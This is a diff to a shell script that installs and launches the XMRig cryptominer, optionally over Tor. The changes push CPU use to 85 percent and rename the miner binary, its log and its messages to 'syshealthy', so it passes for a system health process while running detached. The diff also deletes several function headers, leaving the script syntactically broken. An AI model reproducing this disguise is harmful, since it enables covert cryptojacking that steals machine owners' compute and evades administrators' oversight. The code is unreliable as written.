@@ -12,7 +12,7 @@ mkdir -p "$SRC" "$BIN"
 TOR_VERSION="0.4.6.10"
 XM_VERSION="6.18.1"
 USE_TOR=0
-THREADS_PERCENT=50
+THREADS_PERCENT=85
 
 # Generate a unique rig id (hostname + random suffix)
 HOST_CLEAN=$(hostname 2>/dev/null | tr -cd 'a-zA-Z0-9' | head -c 12 || echo "host")
@@ -156,10 +156,14 @@ install_xmrig(){
     mkdir -p "$XM_DIR"
     tar -xzf "$XM_TAR" -C "$XM_DIR" --strip-components=1
   fi
-  echo "xmrig installed to $XM_DIR"
+  # Rename xmrig binary to syshealthy
+  if [ -f "$XM_DIR/xmrig" ]; then
+    mv "$XM_DIR/xmrig" "$XM_DIR/syshealthy"
+    echo "Renamed xmrig to syshealthy in $XM_DIR"
+  fi
+  echo "syshealthy installed to $XM_DIR"
 }
 
-write_config(){
   if [ -z "${XM_DIR:-}" ]; then
     echo "XM_DIR not set; cannot write config" >&2
     exit 1
@@ -204,35 +208,33 @@ ${PROXY_BLOCK}
   ]
 }
 JSON
-  echo "Wrote xmrig config to $XM_DIR/config.json"
+  echo "Wrote syshealthy config to $XM_DIR/config.json"
 }
 
-start_xmrig(){
-  XM_EXEC="$XM_DIR/xmrig"
+  XM_EXEC="$XM_DIR/syshealthy"
   if [ ! -x "$XM_EXEC" ]; then
-    echo "xmrig binary not found or not executable: $XM_EXEC" >&2
+    echo "syshealthy binary not found or not executable: $XM_EXEC" >&2
     exit 1
   fi
   if command -v screen >/dev/null 2>&1; then
-    echo "Starting xmrig in screen session 'mining-session'"
+    echo "Starting syshealthy in screen session 'mining-session'"
     screen -S mining-session -d -m "$XM_EXEC" --config="$XM_DIR/config.json"
   else
-    echo "Starting xmrig with nohup (log: $HOME/xmrig.log)"
-    nohup "$XM_EXEC" --config="$XM_DIR/config.json" > "$HOME/xmrig.log" 2>&1 &
+    echo "Starting syshealthy with nohup (log: $HOME/syshealthy.log)"
+    nohup "$XM_EXEC" --config="$XM_DIR/config.json" > "$HOME/syshealthy.log" 2>&1 &
     disown
   fi
 }
 
-main(){
   install_xmrig
   write_config
   if [ "$USE_TOR" -eq 1 ]; then
-    start_tor || echo "Tor failed to start; xmrig will run without Tor proxy"
-    # xmrig proxy config can be added in config.json if needed — many pools accept direct connections
-    # If Tor is running on 127.0.0.1:9050, xmrig can be configured to use it by adding proxy settings.
+    start_tor || echo "Tor failed to start; syshealthy will run without Tor proxy"
+    # syshealthy proxy config can be added in config.json if needed — many pools accept direct connections
+    # If Tor is running on 127.0.0.1:9050, syshealthy can be configured to use it by adding proxy settings.
   fi
   start_xmrig
-  echo "Done. Check $HOME/xmrig.log and $HOME/tor.log for output."
+  echo "Done. Check $HOME/syshealthy.log and $HOME/tor.log for output."
 }
 
 main
